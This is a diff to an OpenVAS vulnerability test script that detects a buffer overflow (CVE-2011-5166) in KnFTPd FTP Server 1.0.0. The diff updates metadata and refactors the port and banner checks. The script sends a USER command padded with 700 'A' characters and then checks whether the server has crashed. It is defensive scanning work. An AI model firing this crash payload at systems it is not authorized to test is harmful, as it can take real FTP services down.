@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_knftpd_ftp_srv_mult_cmds_bof_vuln.nasl 12018 2018-10-22 13:31:29Z mmartin $
+# $Id: gb_knftpd_ftp_srv_mult_cmds_bof_vuln.nasl 13347 2019-01-29 15:54:59Z cfischer $
 #
 # KnFTPd FTP Server Multiple Commands Remote Buffer Overflow Vulnerabilities
 #
@@ -27,19 +27,20 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802034");
-  script_version("$Revision: 12018 $");
+  script_version("$Revision: 13347 $");
   script_cve_id("CVE-2011-5166");
   script_bugtraq_id(49427);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-22 15:31:29 +0200 (Mon, 22 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-29 16:54:59 +0100 (Tue, 29 Jan 2019) $");
   script_tag(name:"creation_date", value:"2011-09-07 08:36:57 +0200 (Wed, 07 Sep 2011)");
   script_name("KnFTPd FTP Server Multiple Commands Remote Buffer Overflow Vulnerabilities");
   script_category(ACT_DENIAL);
   script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
   script_family("FTP");
-  script_dependencies("find_service_3digits.nasl");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl");
   script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp_banner/available");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/519498");
   script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/69557");
@@ -47,13 +48,17 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
   arbitrary code on the system or cause the application to crash.");
-  script_tag(name:"affected", value:"KnFTPd Server Version 1.0.0");
+
+  script_tag(name:"affected", value:"KnFTPd Server Version 1.0.0.");
+
   script_tag(name:"insight", value:"The flaws are due to an error while processing the multiple
   commands, which can be exploited to cause a buffer overflow by sending a
   command with specially-crafted an overly long parameter.");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
   of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
   release, disable respective features, remove the product or replace the product by another one.");
+
   script_tag(name:"summary", value:"The host is running KnFTPd Server and is prone to multiple
   buffer overflow vulnerabilities.");
 
@@ -65,17 +70,9 @@ if(description)
 
 include("ftp_func.inc");
 
-port = get_kb_item("Services/ftp");
-if(!port){
-  port = 21;
-}
-
-if(!get_port_state(port)){
-  exit(0);
-}
-
+port = get_ftp_port(default:21);
 banner = get_ftp_banner(port:port);
-if("220 FTP Server ready" >!< banner){
+if(!banner || "220 FTP Server ready" >!< banner){
   exit(0);
 }
 
@@ -85,15 +82,14 @@ if(!soc) {
 }
 
 send(socket:soc, data:"OVTest");
-resp =  recv(socket:soc, length:1024);
+resp = recv(socket:soc, length:1024);
 if("502 OVTest not found." >!< resp){
+  ftp_close(socket:soc);
   exit(0);
 }
 
-## Send USER command with huge parameter
 attack = string("USER ", crap(data: "A", length: 700), "\r\n");
 send(socket:soc, data:attack);
-
 ftp_close(socket:soc);
 
 sleep(2);
@@ -104,12 +100,10 @@ if(!soc1) {
   exit(0);
 }
 
-## Receive data from server
-resp =  recv(socket:soc1, length:1024);
-
+resp = recv(socket:soc1, length:1024);
 ftp_close(socket:soc1);
 
-if("220 FTP Server ready" >!< resp){
+if(!resp || "220 FTP Server ready" >!< resp){
   security_message(port:port);
   exit(0);
 }
